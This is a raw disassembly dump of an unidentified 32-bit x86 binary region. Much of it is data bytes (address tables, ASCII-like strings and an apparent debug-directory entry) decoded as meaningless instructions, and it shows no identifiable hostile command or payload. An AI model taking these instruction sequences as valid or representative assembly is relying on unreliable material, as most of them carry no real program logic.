  43351f:	mov    edx,DWORD PTR [eax]
  433521:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433525:	or     BYTE PTR [edi+eax*1+0x51],dl
  433529:	ret    
  43352a:	xor    ebx,DWORD PTR [ebx+0x37232be]
  433530:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433536:	or     al,0x80
  433538:	jge    0x43353b
  43353a:	mov    DWORD PTR [eax],eax
  43353c:	and    al,0x8
  43353e:	cmp    DWORD PTR [ebp+0x10],eax
  433541:	mov    edx,DWORD PTR [esi]
  433543:	xchg   esp,eax
  433544:	dec    esp
  433545:	add    BYTE PTR [eax],dl
  433547:	mov    ecx,edx
  433549:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43354d:	dec    ebp
  43354e:	into   
  43354f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433555:	mov    edx,DWORD PTR [eax+0x14]
  433558:	das    
  433559:	add    al,0x45
  43355b:	add    BYTE PTR [ebp+0x0],dh
  43355e:	mov    edi,edi
  433560:	and    al,0x50
  433562:	mov    eax,DWORD PTR [eax]
  433564:	and    al,0xd1
  433566:	xor    eax,DWORD PTR [esi]
  433568:	lea    eax,[ebp+0x8]
  43356b:	xor    esi,DWORD PTR [edx+0x3]
  43356e:	add    BYTE PTR [ecx+0x4510fc44],cl
  433574:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  43357a:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433584:	cmp    al,0xff
  433586:	pushf  
  433587:	mov    edi,edi
  433589:	or     BYTE PTR [esi+ecx*1],cl
  43358c:	jne    0x433551
  43358e:	call   0xc355a
  433593:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433597:	mov    ebx,DWORD PTR [eax]
  433599:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  43359d:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  4335a5:	pop    esi
  4335a6:	and    al,0xc9
  4335a8:	call   DWORD PTR [eax]
  4335aa:	and    al,0x55
  4335ac:	call   0x28349d
  4335b1:	add    DWORD PTR [eax+edx*1+0xc],0x31
  4335b6:	clc    
  4335b7:	pushf  
  4335b8:	dec    DWORD PTR [ecx+0x57892474]
  4335be:	jmp    0x433601
  4335c0:	and    al,0x89
  4335c2:	and    al,0x24
  4335c4:	or     BYTE PTR [ebx-0x45ebdbe8],cl
  4335ca:	dec    DWORD PTR [eax]
  4335cc:	and    al,0x7
  4335ce:	pop    esi
  4335cf:	cli    
  4335d0:	in     eax,0x9b
  4335d2:	ret    0x32
  4335d5:	add    eax,edx
  4335d7:	mov    DWORD PTR [ebx+0x688b8924],ebx
  4335dd:	or     al,0xf8
  4335df:	jl     0x43365e
  4335e1:	adc    al,0x9c
  4335e3:	dec    ebp
  4335e4:	push   0xff8b7575
  4335e9:	and    al,0xff
  4335eb:	xor    edi,edi
  4335ed:	mov    esi,DWORD PTR [esp-0x75]
  4335f1:	add    ecx,DWORD PTR [ebx+0x4cca0c0f]
  4335f7:	or     bl,ch
  4335f9:	cmp    DWORD PTR [eax],edx
  4335fb:	sbb    al,0x44
  4335fd:	or     BYTE PTR [eax+edx*1-0x7c],cl
  433601:	xor    ah,BYTE PTR [eax*4-0x7a8accf2]
  433608:	or     BYTE PTR [ecx*4+0x5d5fbf74],ah
  43360f:	test   eax,0x83001010
  433614:	dec    eax
  433615:	adc    BYTE PTR [eax],al
  433617:	adc    edi,DWORD PTR [edx+0x10]
  43361a:	add    cl,bh
  43361c:	jae    0x43362e
  43361e:	add    BYTE PTR [ebx-0x4bffefb4],dh
  433624:	pop    eax
  433625:	adc    BYTE PTR [eax],al
  433627:	fidiv  DWORD PTR [ebp+0x10]
  43362a:	add    dh,bl
  43362c:	movups xmm0,XMMWORD PTR [eax]
  43362f:	popf   
  433630:	push   cs
  433631:	adc    BYTE PTR [eax],al
  433633:	ins    DWORD PTR es:[edi],dx
  433634:	or     BYTE PTR [eax],dl
  433636:	add    BYTE PTR [ebx+eiz*2+0x360f0010],cl
  43363d:	inc    ebx
  43363e:	add    BYTE PTR [ebx],dl
  433640:	ss inc ebx
  433642:	add    BYTE PTR [edi],dl
  433644:	ss inc ebx
  433646:	add    BYTE PTR [ebx],bl
  433648:	ss inc ebx
  43364a:	add    BYTE PTR [edi],bl
  43364c:	ss inc ebx
  43364e:	add    BYTE PTR [ebx],ah
  433650:	ss inc ebx
  433652:	add    BYTE PTR [edi],ah
  433654:	ss inc ebx
  433656:	add    BYTE PTR [ebx],ch
  433658:	ss inc ebx
  43365a:	add    BYTE PTR [edi],ch
  43365c:	ss inc ebx
  43365e:	add    BYTE PTR [ebx],dh
  433660:	ss inc ebx
  433662:	add    BYTE PTR [edi],dh
  433664:	ss inc ebx
  433666:	add    BYTE PTR [ebx-0x73ffefdd],bh
  43366c:	cmp    al,0x10
  43366e:	add    BYTE PTR [ebx+0x30],cl
  433671:	adc    BYTE PTR [eax],al
  433673:	sub    al,0xc
  433675:	adc    BYTE PTR [eax],al
  433677:	push   ds
  433678:	adc    BYTE PTR ds:[eax],al
  43367b:	mov    bh,0x56
  43367d:	adc    BYTE PTR [eax],al
  43367f:	adc    eax,DWORD PTR [eax+edx*1+0x0]
  433683:	cmp    al,0x4f
  433685:	adc    BYTE PTR [eax],al
  433687:	addr16 ss inc ebx
  43368a:	add    BYTE PTR [ebx+0x36],ch
  43368d:	inc    ebx
  43368e:	add    BYTE PTR [edi+0x36],ch
  433691:	inc    ebx
  433692:	add    BYTE PTR [ebx+0x36],dh
  433695:	inc    ebx
  433696:	add    BYTE PTR [edi+0x36],dh
  433699:	inc    ebx
  43369a:	add    BYTE PTR [ebx+0x36],bh
  43369d:	inc    ebx
  43369e:	add    BYTE PTR [edi+0x36],bh
  4336a1:	inc    ebx
  4336a2:	add    BYTE PTR [ebx-0x23ffbcca],al
  4336a8:	pop    esp
  4336a9:	adc    BYTE PTR [eax],al
  4336ab:	jle    0x4336cd
  4336ad:	adc    BYTE PTR [eax],al
  4336af:	cld    
  4336b0:	dec    edx
  4336b1:	adc    BYTE PTR [eax],al
  4336b3:	add    al,0xb
  4336b5:	adc    BYTE PTR [eax],al
  4336b7:	push   ebx
  4336b8:	ins    DWORD PTR es:[edi],dx
  4336b9:	adc    BYTE PTR [eax],al
  4336bb:	fs jl  0x4336ce
  4336be:	add    BYTE PTR [edx+0x42001015],ah
  4336c4:	jge    0x4336d6
  4336c6:	add    BYTE PTR [edi-0x54ffbcca],ah
  4336cc:	ss inc ebx
  4336ce:	add    BYTE PTR [edi-0x4cffbcca],ch
  4336d4:	ss inc ebx
  4336d6:	add    BYTE PTR [edi-0x44ffbcca],dh
  4336dc:	ss inc ebx
  4336de:	add    BYTE PTR [edi-0x3cffbcca],bh
  4336e4:	ss inc ebx
  4336e6:	add    BYTE PTR [edi+0x2300103a],ah
  4336ec:	aas    
  4336ed:	adc    BYTE PTR [eax],al
  4336ef:	jne    0x4336fc
  4336f1:	adc    BYTE PTR [eax],al
  4336f3:	fldenv [esi]
  4336f5:	adc    BYTE PTR [eax],al
  4336f7:	xchg   esp,eax
  4336f8:	push   0x10
  4336fa:	add    bl,ah
  4336fc:	pop    eax
  4336fd:	adc    BYTE PTR [eax],al
  4336ff:	in     al,0x2f
  433701:	adc    BYTE PTR [eax],al
  433703:	leave  
  433704:	sbb    DWORD PTR [eax],edx
  433706:	add    bh,ah
  433708:	ss inc ebx
  43370a:	add    bl,ch
  43370c:	ss inc ebx
  43370e:	add    bh,ch
  433710:	ss inc ebx
  433712:	add    bl,dh
  433714:	ss inc ebx
  433716:	add    bh,dh
  433718:	ss inc ebx
  43371a:	add    bl,bh
  43371c:	ss inc ebx
  43371e:	add    bh,bh
  433720:	ss inc ebx
  433722:	add    BYTE PTR [ebx],al
  433724:	aaa    
  433725:	inc    ebx
  433726:	add    BYTE PTR [ebp+0x1d001062],bh
  43372c:	adc    BYTE PTR [eax],dl
  43372e:	add    BYTE PTR [edi+0x51],dl
  433731:	adc    BYTE PTR [eax],al
  433733:	dec    eax
  433734:	ins    DWORD PTR es:[edi],dx
  433735:	adc    BYTE PTR [eax],al
  433737:	mov    eax,DWORD PTR [edi]
  433739:	adc    BYTE PTR [eax],al
  43373b:	mov    ah,0x7
  43373d:	adc    BYTE PTR [eax],al
  43373f:	ror    DWORD PTR [esi],1
  433741:	adc    BYTE PTR [eax],al
  433743:	pop    edi
  433744:	inc    ebp
  433745:	adc    BYTE PTR [eax],al
  433747:	daa    
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [ebx],ch
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [edi],ch
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [ebx],dh
  433754:	aaa    
  433755:	inc    ebx
  433756:	add    BYTE PTR [edi],dh
  433758:	aaa    
  433759:	inc    ebx
  43375a:	add    BYTE PTR [ebx],bh
  43375c:	aaa    
  43375d:	inc    ebx
  43375e:	add    BYTE PTR [edi],bh
  433760:	aaa    
  433761:	inc    ebx
  433762:	add    BYTE PTR [ebx+0x37],al
  433765:	inc    ebx
  433766:	add    BYTE PTR [ecx+0x36],cl
  433769:	push   eax
  43376a:	pop    edi
  43376b:	ss inc ebx
  43376d:	ss pop edx
  43376f:	xor    ebx,DWORD PTR [edi+0x52]
  433772:	add    BYTE PTR [edi+ecx*2+0x32],dl
  433776:	pop    edi
  433777:	dec    esi
  433778:	dec    esp
  433779:	dec    eax
  43377a:	xor    esi,DWORD PTR [edx]
  43377c:	pop    edi
  43377d:	xor    al,0x4b
  43377f:	add    BYTE PTR [eax+0x49],cl
  433782:	push   ebp
  433783:	xor    al,0x5f
  433785:	dec    esp
  433786:	inc    edx
  433787:	dec    ecx
  433788:	cmp    DWORD PTR [edi+ebx*2],esi
  43378b:	pop    ecx
  43378c:	inc    edi
  43378d:	add    BYTE PTR [eax+0x50],bl
  433790:	dec    eax
  433791:	pop    edi
  433792:	push   ebp
  433793:	push   ecx
  433794:	inc    edi
  433795:	xor    cl,BYTE PTR [edx+0x38]
  433798:	push   esi
  433799:	add    BYTE PTR [ebx+0x4a],al
  43379c:	push   edx
  43379d:	pop    edi
  43379e:	dec    edi
  43379f:	dec    eax
  4337a0:	dec    edi
  4337a1:	dec    edi
  4337a2:	dec    edx
  4337a3:	add    BYTE PTR [ecx+0x52],al
  4337a6:	cmp    DWORD PTR [edi+0x56],ebx
  4337a9:	aaa    
  4337aa:	dec    esp
  4337ab:	cmp    DWORD PTR [ebx+0x5f],eax
  4337ae:	push   edx
  4337af:	inc    esp
  4337b0:	add    BYTE PTR [ecx+0x37],bl
  4337b3:	inc    esp
  4337b4:	pop    edi
  4337b5:	dec    ecx
  4337b6:	xor    esi,DWORD PTR [edi]
  4337b8:	xor    DWORD PTR [edi+0x49],ebx
  4337bb:	push   esp
  4337bc:	xor    eax,DWORD PTR [eax]
  4337be:	push   edx
  4337bf:	xor    BYTE PTR [eax+0x5f],bl
  4337c2:	dec    eax
  4337c3:	push   edi
  4337c4:	inc    esi
  4337c5:	xor    DWORD PTR [edi+0x5f],edx
  4337c8:	cmp    BYTE PTR [ebx+0x37],dl
  4337cb:	add    BYTE PTR [esi+0x42],dl
  4337ce:	dec    ecx
  4337cf:	xor    ebx,DWORD PTR [edi+0x45]
  4337d2:	xor    BYTE PTR [ebp+0x5f],cl
  4337d5:	xor    al,0x34
  4337d7:	xor    BYTE PTR [edx+0x5f],cl
  4337da:	inc    edi
  4337db:	add    BYTE PTR [edx+0x57],dl
  4337de:	xor    ebx,DWORD PTR [edi+0x31]
  4337e1:	dec    edx
  4337e2:	push   edi
  4337e3:	xor    eax,0x4d435f
  4337e8:	dec    ecx
  4337e9:	xor    eax,0x36365f39
  4337ee:	dec    eax
  4337ef:	xor    BYTE PTR [eax],al
  4337f1:	dec    edi
  4337f2:	inc    ebx
  4337f3:	push   edi
  4337f4:	pop    edi
  4337f5:	inc    edi
  4337f6:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  4337fb:	add    BYTE PTR [edx+0x0],al
  4337fe:	pop    eax
  4337ff:	add    BYTE PTR [edi+0x0],al
  433802:	add    BYTE PTR ss:[edi+0x0],bl
  433806:	push   esi
  433807:	add    BYTE PTR [ebx+0x0],al
  43380a:	dec    esi
  43380b:	add    BYTE PTR [eax+eax*1+0x0],al
  43380f:	add    BYTE PTR [edi+0x0],cl
  433812:	dec    ebp
  433813:	add    BYTE PTR [edi+0x0],al
  433816:	xor    eax,DWORD PTR [eax]
  433818:	pop    edi
  433819:	add    BYTE PTR [eax+eax*1],dh
  43381c:	dec    esi
  43381d:	add    BYTE PTR [edx+0x0],bl
  433820:	cmp    BYTE PTR [eax],al
  433822:	pop    edi
  433823:	add    BYTE PTR [eax+0x0],bl
  433826:	cmp    BYTE PTR [eax],al
  433828:	add    BYTE PTR [eax],al
  43382a:	push   edx
  43382b:	add    BYTE PTR [eax+0x0],bl
  43382e:	push   ecx
  43382f:	add    BYTE PTR [edi+0x0],bl
  433832:	dec    esp
  433833:	add    BYTE PTR [edx+0x0],dl
  433836:	dec    ecx
  433837:	add    BYTE PTR [edi+0x0],cl
  43383a:	inc    esp
  43383b:	add    BYTE PTR [edi+0x0],bl
  43383e:	dec    edi
  43383f:	add    BYTE PTR [ebx],dh
  433841:	add    BYTE PTR [eax+eax*1+0x0],al
  433845:	add    BYTE PTR [ebx+0x0],al
  433848:	push   eax
  433849:	add    BYTE PTR [ebp+0x0],al
  43384c:	pop    edi
  43384d:	add    BYTE PTR ds:0x39004500,dh
  433853:	add    BYTE PTR [edi+0x0],bl
  433856:	push   esi
  433857:	add    BYTE PTR [eax],al
  433859:	add    BYTE PTR [edi+0x0],al
  43385c:	dec    esi
  43385d:	add    BYTE PTR [esi+0x0],dl
  433860:	pop    edi
  433861:	add    BYTE PTR [edi+0x0],al
  433864:	push   esp
  433865:	add    BYTE PTR [eax+0x0],cl
  433868:	xor    al,BYTE PTR [eax]
  43386a:	xor    DWORD PTR [eax],eax
  43386c:	pop    edi
  43386d:	add    BYTE PTR [edi+0x0],cl
  433870:	add    BYTE PTR ss:[ebx],dh
  433873:	add    BYTE PTR [eax],al
  433875:	add    BYTE PTR [eax+eax*1+0x45],al
  433879:	add    BYTE PTR [ecx+0x0],cl
  43387c:	pop    edi
  43387d:	add    BYTE PTR [edx+0x0],dl
  433880:	dec    eax
  433881:	add    BYTE PTR [eax+eax*1],dh
  433884:	dec    eax
  433885:	add    BYTE PTR [eax],al
  433887:	add    BYTE PTR [eax],al
  433889:	push   edx
  43388a:	push   ebx
  43388b:	inc    esp
  43388c:	push   ebx
  43388d:	ret    0x5038
  433890:	mov    bl,BYTE PTR [edx-0x61b82006]
  433896:	cli    
  433897:	lea    edx,[ecx]
  433899:	loop   0x43387f
  43389b:	jge    0x4338a8
  43389d:	push   cs
  43389e:	add    BYTE PTR [eax],al
  4338a0:	add    BYTE PTR [ecx+0x3a],dl
  4338a3:	pop    esp
  4338a4:	js     0x4338fe
  4338a6:	ins    DWORD PTR es:[edi],dx
  4338a7:	arpl   WORD PTR [esi+0x76],sp
  4338aa:	addr16 jp 0x433921
  4338ad:	pop    esp
  4338ae:	inc    ebp
  4338af:	inc    esi
  4338b0:	dec    edx
  4338b1:	bound  ebp,QWORD PTR [edx+0x67]
  4338b4:	popa   
  4338b5:	push   0x6c776a5c
  4338ba:	bound  esp,QWORD PTR [eax+ebp*2+0x70]
  4338be:	popa   
  4338bf:	bound  esi,QWORD PTR [edi+0x65]
  4338c2:	cs jo  0x433929
  4338c5:	bound  eax,QWORD PTR [eax]
	...
